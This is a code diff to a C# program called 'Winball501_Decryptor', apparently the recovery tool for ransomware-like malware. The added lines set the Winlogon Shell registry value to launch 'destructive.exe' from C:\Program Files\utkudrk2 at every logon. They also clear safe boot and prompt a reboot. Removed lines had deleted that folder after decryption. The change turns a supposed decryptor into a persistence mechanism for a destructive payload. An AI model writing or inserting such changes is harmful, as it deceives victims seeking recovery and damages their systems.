@@ -51,19 +51,35 @@ namespace Winball501_Decryptor
                 try
                 {
                     System.Diagnostics.Process.Start("cmd.exe", "/c reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Shell /f");
-                    System.Diagnostics.Process.Start("cmd.exe", "/c reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Shell /t REG_SZ /d \"explorer.exe\" /f");
+                    System.Diagnostics.Process.Start("cmd.exe", "/c reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Shell /t REG_SZ /d \"explorer.exe, C:\\Program Files\\utkudrk2\\destructive.exe\" /f");
                 }
                 catch (Exception ex)
                 {
                     MessageBox.Show("Error modifying registry: " + ex.Message);
                 }
+                // Run bcdedit command to remove safeboot
                 try
                 {
-                    System.Diagnostics.Process.Start("explorer.exe");
+                    System.Diagnostics.Process.Start("cmd.exe", "/c bcdedit /deletevalue {current} safeboot");
                 }
                 catch (Exception ex)
                 {
-                    MessageBox.Show("Error starting explorer.exe: " + ex.Message);
+                    MessageBox.Show("Error running bcdedit: " + ex.Message);
+                }
+                // Ask user to restart PC
+                DialogResult result = MessageBox.Show("A system restart is required for exit safe mode. Do you want to restart now?", "Restart Required", MessageBoxButtons.YesNo, MessageBoxIcon.Information);
+
+                if (result == DialogResult.Yes)
+                {
+                    try
+                    {
+                        // Execute the shutdown command to restart the PC in 7 seconds
+                        System.Diagnostics.Process.Start("cmd.exe", "/c shutdown -r -t 7");
+                    }
+                    catch (Exception ex)
+                    {
+                        MessageBox.Show("Error restarting the PC: " + ex.Message);
+                    }
                 }
             }
             else
@@ -253,7 +269,6 @@ namespace Winball501_Decryptor
             public short rttoperation = 0;
             string key;
             string dir;
-            bool decryptionSuccessful = false;  // Flag to track decryption success
 
             public Decrypt(Form1 form, string key, string dir)
             {
@@ -316,7 +331,6 @@ namespace Winball501_Decryptor
                                     sifreler.FlushFinalBlock();
                                 }
                             }
-                            decryptionSuccessful = true;
 
                             form.listBox1.Items.Add("Decrypted: " + dosyalar);
 
@@ -355,38 +369,6 @@ namespace Winball501_Decryptor
                         Decrypt decrypt = new Decrypt(form, key, dir);
                         Thread t = new Thread(new ThreadStart(decrypt.run));
                         t.Start();
-                    }
-
-                    // After decryption (successful or not), perform final actions only if decryption was successful
-                    if (decryptionSuccessful)
-                    {
-                        // Perform the actions like folder deletion, bcdedit, and registry modifications
-                        this.form.Invoke(new Action(() =>
-                        {
-                            // Remove the folder if it exists
-                            string folderPath = @"C:\Program Files\utkudrk2";
-                            if (Directory.Exists(folderPath))
-                            {
-                                try
-                                {
-                                    Directory.Delete(folderPath, true);  // Delete folder and its contents
-                                }
-                                catch (Exception ex)
-                                {
-                                    MessageBox.Show("Error deleting folder: " + ex.Message);
-                                }
-                            }
-
-                            // Run bcdedit command to remove safeboot
-                            try
-                            {
-                                System.Diagnostics.Process.Start("cmd.exe", "/c bcdedit /deletevalue {current} safeboot");
-                            }
-                            catch (Exception ex)
-                            {
-                                MessageBox.Show("Error running bcdedit: " + ex.Message);
-                            }
-                        }));
                     }
                 }
                 catch (Exception ex)
